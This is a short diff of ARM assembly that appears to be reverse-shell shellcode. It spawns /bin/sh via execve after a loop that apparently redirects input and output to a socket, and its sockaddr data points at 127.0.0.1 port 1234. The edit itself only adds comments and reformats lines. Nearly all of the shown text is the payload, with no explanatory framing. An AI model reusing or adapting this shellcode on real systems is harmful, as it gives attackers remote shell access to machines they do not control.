@@ -43,6 +43,7 @@ dup_loop:
 
     // execve("/bin/sh", NULL, NULL);
     adr    r0, sh        // r0 = "/bin/sh" 
+    // umull r1, r2, r0, r0
     eor    r2, r2, r2    // r2 = NULL
     eor    r1, r1, r1    // r1 = NULL
     strb   r2, [r0, #7]  // add null terminator    
@@ -50,9 +51,9 @@ dup_loop:
     svc    1
     nop                  // alignment by 4 bytes
 sin_port:    
-.word  0xd2040002
+    .word  0xd2040002    // 1234, AF_INET
 sin_addr:
-.word  0x0100007f
+    .word  0x0100007f    // 127.0.0.1
 sh:  
-.ascii "/bin/shX"
+    .ascii "/bin/shX"
 
